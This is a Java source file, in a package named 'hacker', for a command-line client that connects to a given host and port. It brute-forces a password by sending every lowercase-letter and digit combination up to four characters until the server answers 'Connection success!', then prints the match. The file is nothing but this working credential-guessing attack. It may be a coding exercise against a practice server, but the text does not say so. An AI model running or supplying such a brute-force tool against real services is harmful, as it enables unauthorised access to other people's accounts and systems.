package hacker;

import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Objects;

public class Main {

    static NetClient client;
    private static String pw = null;

    public static void main(String[] args) {
        if (args.length != 2) {
            System.out.println("Invalid number of arguments!");
            System.exit(1);
        }
        String address = args[0];
        int port = Integer.parseInt(args[1]);


        try (Socket socket = new Socket(address, port)) {
            client = new NetClient(socket);
            String response = "";


            for (int maxLength = 0; maxLength < 5; maxLength++) {
                generate("", maxLength);
            }

            System.out.println(pw);


        } catch (UnknownHostException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }


    }

    public static void generate(String current, int maxLength) {
        if (current.length() == maxLength) {
            if (pw != null) {
                return;
            }
            if (Objects.equals(client.sendAndReceive(current), "Connection success!")) {
                pw = current;
            }
            return;
        }

        // Loop through 'a' to 'z'
        for (char c = 'a'; c <= 'z'; c++) {
            if (pw != null) {
                return;
            }
            generate(current + c, maxLength);
        }

        // Loop through '0' to '9'
        for (char c = '0'; c <= '9'; c++) {
            if (pw != null) {
                return;
            }
            generate(current + c, maxLength);
        }
    }
}
